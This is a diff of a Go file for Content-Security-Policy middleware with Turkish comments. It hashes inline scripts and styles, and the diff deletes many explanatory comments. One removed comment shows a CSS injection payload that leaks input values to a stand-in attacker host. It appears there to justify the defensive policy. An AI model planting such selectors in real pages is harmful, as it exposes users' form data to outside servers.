@@ -8,34 +8,6 @@ import (
 	"strings"
 )
 
-// ---- CSP: satır içi script'ler için HASH tabanlı izin listesi ----
-//
-// NEDEN HASH, NEDEN NONCE DEĞİL:
-//
-// İlk uygulamada istek başına rastgele nonce kullanılmıştı. Ancak herkese açık
-// sayfalar `Cache-Control: public, max-age=60, s-maxage=300` ile CDN'de
-// önbellekleniyor. Önbelleğe alınmış yanıt tüm kullanıcılara AYNI nonce ile
-// servis edilir; bu da nonce'un tekilliğini bozar (CSP'de nonce yanıt başına
-// tekil olmalıdır). Saldırgan kendi aldığı yanıttan nonce'u öğrenip başka
-// kullanıcılara servis edilecek yanıt için kullanabilir.
-//
-// Hash yaklaşımı bu sorunu kökten çözer:
-//   - HTML bayt-aynı kalır (nonce eklenmez) → önbellek güvenli,
-//   - politika yalnız o yanıtta GERÇEKTEN bulunan satır içi script'lerin
-//     sha256 özetlerini listeler.
-//
-// NEDEN MIDDLEWARE DÜZEYİNDE:
-//
-// Önce her render fonksiyonu (s.render, s.renderPublic, renderPartial, AMP,
-// akış) kendi çıktısından hash üretip başlığı yazıyordu. Uygulamada bunun
-// kırılgan olduğu görüldü: aynı yanıtı birden fazla yol yazabildiğinde
-// (templ panel + sayfa kabuğu) ve satır içi script içeriği istek verisine
-// göre değiştiğinde başlık ile gövde ayrışabiliyordu — sonuç: tarayıcıda
-// "Executing inline script violates..." hataları.
-//
-// withHTMLCSP tüm HTML yanıtını tamponlar ve hash'leri YAZILAN NİHAİ
-// baytlardan üretir; başlık ile gövde tanım gereği tutarlıdır.
-
 // cspBufferLimit tamponlanacak en büyük HTML yanıtı. Aşılırsa yanıt
 // tamponlanmadan akıtılır (bellek koruması); CSP o durumda hash'siz kalır.
 const cspBufferLimit = 8 << 20 // 8 MB
@@ -52,9 +24,6 @@ func (s *Server) withHTMLCSP(next http.Handler) http.Handler {
 type cspWriter struct {
 	w        http.ResponseWriter
 	raporURL string
-	// hashes: gövde → CSP başlığı süreç içi önbelleği (nil = önbellek kapalı;
-	// testlerde sınanır). Aynı gövde her seferinde yeniden taranıp yeniden
-	// hash'leniyordu; profil bu yolu CPU'nun ~%9'u olarak gösterdi.
 	hashes   *cspHashCache
 	buf      strings.Builder
 	status   int  // handler'ın bildirdiği durum kodu
@@ -78,9 +47,6 @@ func (c *cspWriter) WriteHeader(code int) {
 	}
 }
 
-// durumIlet durum kodunu alttaki yazıcıya bir kez geçirir.
-// Bu olmadan tamponlama sırasında bildirilen 204/302/404 gibi kodlar
-// kaybolur ve her yanıt 200 döner.
 func (c *cspWriter) durumIlet(code int) {
 	if c.iletildi {
 		return
@@ -119,26 +85,6 @@ func (c *cspWriter) Write(p []byte) (int, error) {
 	return c.buf.Write(p)
 }
 
-// Flush alt yazıcıyı boşaltır.
-//
-// HTML YANITLARINDA TAMPON KORUNUR — bu bir hata düzeltmesidir, tercih
-// değil. `templ` bileşenini bitirirken kendi iç tamponunu boşaltıyor ve
-// `http.Flusher` arayüzünü görürse `Flush()` çağırıyor
-// (`runtime.ReleaseBuffer` → `Buffer.Flush`). Eski sürüm bu çağrıyı
-// "akışa geç" sayıp `akis=true` yapıyordu; `finish()` de akışta CSP
-// üretmediği için yanıt HASH'SİZ politika alıyordu.
-//
-// Sonuç (ölçüldü, 6 Kasım 2026): templ ile render edilen HER sayfada
-// satır içi `<script>` sessizce engelleniyordu — tarayıcı konsolunda
-// "Executing inline script violates..." hatası; tema başlangıç betiği
-// hiç çalışmadı, koyu tema tercihi uygulanmadı. Hata görünmüyordu çünkü
-// sayfa yine 200 dönüyordu.
-//
-// HTML için tamponu tutmak zorunlu: hash'ler ancak NİHAİ gövdeden
-// üretilebilir. Bellek koruması zaten var (`cspBufferLimit`, 8 MB).
-// SSE ve HTML dışı akışlar (zip/csv dışa aktarma) etkilenmez: onların
-// Content-Type'ı `text/event-stream` ya da HTML değil, aşağıdaki koşul
-// onları eskisi gibi akıtır.
 func (c *cspWriter) Flush() {
 	ct := c.w.Header().Get("Content-Type")
 	htmlMi := ct == "" || strings.HasPrefix(ct, "text/html")
@@ -157,12 +103,6 @@ func (c *cspWriter) Flush() {
 
 func (c *cspWriter) Unwrap() http.ResponseWriter { return c.w }
 
-// bosalt biriken tamponu alttaki yazıcıya yazar.
-// cspBasligi gövde için CSP başlığını üretir (önbellekli).
-//
-// Önbellek anahtarı gövdenin kendisidir: CSP hash'leri yalnız gövdeye bağlı.
-// Iskalamada gövde iki kez taranır + her blok için sha256 hesaplanır; bu
-// istek yolundaki en pahalı saf-CPU işiydi (profil: indexFold ~%9).
 func (c *cspWriter) cspBasligi(govde string) string {
 	if c.hashes != nil {
 		if v, ok := c.hashes.Get(govde); ok {
@@ -211,34 +151,10 @@ func min(a, b int) int {
 	return b
 }
 
-// vendorStyleHashes: çalışma anında JS'in enjekte ettiği, İÇERİĞİ SABİT
-// stil bloklarının hash'leri.
-// TipTap/ProseMirror editörü kendi temel yerleşim CSS'ini
-// `<style data-tiptap-style>` olarak sayfaya ekler (paket içinde sabit metin).
-// Bu blok sunucu HTML'inde olmadığı için cspStyleHashes onu göremez; hash'i
-// burada sabit olarak verilir. İçerik değişirse (paket yükseltmesi) hash
-// tutmaz ve tarayıcı bloğu engeller — `e2e/tests/csp_style.test.js` bunu
-// yakalar. Aynı kurallar `static/prosemirror.css` içinde de durduğu için
-// engellense bile editör yerleşimi bozulmaz.
-//
-// Yeni bir sabit enjeksiyon eklenirse: hash'i buraya ekle.
 var vendorStyleHashes = []string{
 	"'sha256-PlumsSlvJ7vvWzjqibGAYKq92O3y/4JTxWWsWJvyUYA='", // prosemirror-view temel CSS
 }
 
-// cspStyleHashes HTML'deki satır içi <style> bloklarının sha256 özetlerini
-// döndürür (CSP biçiminde: "'sha256-<base64>'").
-//
-// Neden: sayfa başlığındaki `<style>{{.SiteBg}}</style>`, `.DesignCSS`,
-// `.AdminCSS` ve şablon içi stil blokları **veritabanından gelen** değerlerle
-// kurulur. CSP'de `style-src 'unsafe-inline'` varken, HTML enjeksiyonu
-// yapabilen bir saldırgan `<style>` bloğuyla CSS sızdırma (ör.
-// `input[value^="a"]{background:url(//saldirgan)`) yapabilirdi.
-// Hash ile yalnız sunucunun ürettiği baytlar izinli olur; enjekte edilen
-// blok tarayıcıda çalışmaz.
-//
-// `style="..."` ÖZNİTELİKLERİ ayrı direktifle (`style-src-attr`) yönetilir;
-// oradaki 'unsafe-inline' bilinçli olarak duruyor (aşağıdaki buildCSP yorumu).
 func cspStyleHashes(html string) []string {
 	if indexFold(html, "<style") < 0 {
 		return nil
@@ -283,13 +199,6 @@ func cspStyleHashes(html string) []string {
 	return out
 }
 
-// cspScriptHashes HTML'deki satır içi <script> bloklarının sha256 özetlerini
-// döndürür (CSP biçiminde: "sha256-<base64>").
-//
-// Atlananlar:
-//   - src= taşıyan (harici) script'ler — 'self' zaten izinli,
-//   - veri blokları (application/json, ld+json, text/template, text/plain) —
-//     yürütülmezler, CSP bunlara uygulanmaz.
 func cspScriptHashes(html string) []string {
 	if indexFold(html, "<script") < 0 {
 		return nil
@@ -355,14 +264,6 @@ func veriBloguMu(lowTag string) bool {
 	return false
 }
 
-// indexFold büyük/küçük harf duyarsız strings.Index — ASCII güvenli.
-//
-// DİKKAT: `strings.ToLower` ile arama YAPILMAZ. Türkçe metinde ToLower bayt
-// uzunluğunu değiştirebilir (ör. 'İ' U+0130 → "i̇" iki kod noktası), bu da
-// küçük harfli metinden alınan indeksin orijinal metinde kaymasına yol açar.
-// Bu hata, satır içi script hash'lerinin gövdeyle uyuşmaması olarak ortaya
-// çıktı (tarayıcıda "Executing inline script violates...").
-// Burada karşılaştırma bayt bayt ve boyut koruyucu yapılır.
 func indexFold(s, alt string) int {
 	n, m := len(s), len(alt)
 	if m == 0 {
@@ -394,21 +295,6 @@ func indexFold(s, alt string) int {
 	return -1
 }
 
-// buildCSP zorunlu politikayı üretir.
-//
-// script-src: 'self' + sayfadaki satır içi script'lerin hash'leri + AMP/GTM.
-// 'unsafe-inline' ve 'unsafe-eval' YOK.
-//
-// style-src-elem: 'self' + sayfadaki satır içi <style> bloklarının hash'leri.
-// 'unsafe-inline' YOK → enjekte edilen <style> çalışmaz (CSS ile veri
-// sızdırma kapalı).
-//
-// style-src-attr'de 'unsafe-inline' BİLİNÇLİ olarak duruyor: sayfalarda
-// yüzlerce `style="..."` özniteliği var (≈1.500 sabit + ≈70 dinamik) ve
-// öznitelikler hash ile izinlenemez — CSP'de öznitelik hash'i yoktur, yalnız
-// 'unsafe-hashes' vardır ve o da 'unsafe-inline'a çok yakındır. Stil tabanlı
-// XSS riski script'e göre çok düşük olduğundan bilinçli erteleme; kapatmak
-// özniteliklerin sınıfa taşınmasını gerektirir (ayrı iş).
 func buildCSP(scriptHashes, styleHashes []string, collabURL, reportURL string) string {
 	scriptSrc := "script-src 'self'"
 	for _, h := range scriptHashes {
@@ -416,11 +302,6 @@ func buildCSP(scriptHashes, styleHashes []string, collabURL, reportURL string) s
 	}
 	// AMP sayfaları kendi çalışma zamanını cdn.ampproject.org'dan yükler.
 	scriptSrc += " https://www.googletagmanager.com https://cdn.ampproject.org"
-	// Cloudflare Web Analytics beacon'ı tünelin ucunda sayfaya enjekte edilir;
-	// kaynak listesinde olmadığı için her istekte engelleniyordu. Üretim CSP
-	// raporlarında sürekli görünen ihlal buydu:
-	//   script-src-elem blocked=https://static.cloudflareinsights.com
-	// Beacon ölçümü cloudflareinsights.com/cdn-cgi/rum adresine POST eder.
 	scriptSrc += " https://static.cloudflareinsights.com"
 
 	styleSrc := "style-src 'self'"
@@ -452,9 +333,6 @@ func buildCSP(scriptHashes, styleHashes []string, collabURL, reportURL string) s
 		"object-src 'none'" + reportDirektifi(reportURL)
 }
 
-// reportDirektifi CSP raporlama direktifini üretir.
-// report-uri: CSP3'te "deprecated" ama tüm tarayıcılarda çalışır.
-// report-to: yeni biçim; grup adı "csp" ve Report-To başlığıyla eşleşir.
 func reportDirektifi(reportURL string) string {
 	if reportURL == "" {
 		return ""
